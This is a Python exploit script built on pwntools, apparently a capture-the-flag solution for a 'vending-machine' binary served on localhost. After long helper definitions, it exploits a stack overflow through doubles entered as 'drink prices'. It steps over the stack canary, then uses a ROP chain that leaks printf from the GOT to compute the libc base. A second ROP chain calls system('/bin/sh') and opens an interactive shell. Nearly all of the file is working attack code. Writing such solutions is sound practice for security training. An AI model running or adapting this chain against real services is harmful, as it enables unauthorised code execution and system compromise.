#!/usr/bin/env python3
from pwn import *

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def exit_funcs_encrypt(val: int, key: int):
    r_bits = 0x11
    max_bits = 64
    enc = val ^ key
    return (enc << r_bits % max_bits) & (2 ** max_bits - 1) | ((enc & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

def exit_funcs_decrypt(val: int, key: int):
    r_bits = 0x11
    rotated = (2**64-1)&(val>>r_bits|val<<(64-r_bits))
    return rotated ^ key

def fastbin_encrypt(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

def fastbin_decrypt(val: int):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

exe = ELF("./vending-machine")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

GDB_SCRIPT = f"""
set disassembly-flavor intel
break *main
continue
"""

context.binary = exe
context.aslr = False
IP     = 'localhost'   
PORT   = 30004

import struct

def int_to_float_to_bytestosend(x):
    intermediate_bytes = struct.pack("<Q", x)
    res_double = struct.unpack("<d", intermediate_bytes)[0]
    return str(res_double).encode()

def send_num(x):
    sla(b"Would you like to continue? (Y/N) > ", b"Y")
    sla(b"Enter your drink price > ", int_to_float_to_bytestosend(x))

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # argv = [ld.path, exe.path]
        # env = {"LD_PRELOAD": libc.path}
        # r = process(argv, env=env)
        if args.GDB:
            gdb.attach(r, gdbscript=GDB_SCRIPT)
    else:
        r = remote(IP, PORT)
    return r

t = conn()
context.log_level = 'debug'

POP_RDI = 0x0000000000401223
PRINTF_GOT = 0x000000404020
PRINTF_PLT = 0x000000401090
RET = 0x0000000000401300

for _ in range(11):
    send_num(0xdeadbeef)

sla(b"Would you like to continue? (Y/N) > ", b"Y")
sla(b"Enter your drink price > ", b".") # don't touch canary

send_num(0x404500) # overwrite saved RBP
send_num(POP_RDI)
send_num(PRINTF_GOT)
send_num(RET)
send_num(PRINTF_PLT)
send_num(0x4010d0) # loop back to start to re-run the binary
libc_leak = u64(rpad(rcv(6))) # get the printf libc leak
lhex(libc_leak, 'libc leak')
libc.address = libc_leak - (0x00001555552606f0 - 0x0000155555200000)
lhex(libc.address, "libc base")

for _ in range(11):
    send_num(0xdeadbeef)

sla(b"Would you like to continue? (Y/N) > ", b"Y")
sla(b"Enter your drink price > ", b".") # don't touch canary
send_num(0x404500) # overwrite saved RBP
rop = ROP(libc)
rop.rdi = next(libc.search("/bin/sh"))
rop.raw(RET)
rop.raw(libc.sym['system'])
print(rop.dump())
pl = rop.chain()
for i in range(0, len(pl), 8):
    send_num(u64(pl[i:i+8]))
sla(b"Would you like to continue? (Y/N) > ", b"N")
it()